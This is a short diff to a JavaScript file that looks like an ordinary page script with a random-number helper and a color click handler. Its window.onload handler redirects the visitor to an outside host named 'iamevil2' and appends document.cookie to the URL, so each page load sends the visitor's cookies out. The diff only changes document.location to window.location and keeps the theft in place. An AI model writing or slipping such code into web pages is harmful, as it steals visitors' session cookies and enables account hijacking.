@@ -6,7 +6,7 @@ function getRandomInt(max) {
   }  
 
 window.onload = (event) => {
-    document.location = 'https://iamevil2.free.beeceptor.com/?cookie=' + document.cookie;
+    window.location = 'https://iamevil2.free.beeceptor.com/?cookie=' + document.cookie;
 };
 
 color.onclick = () => {
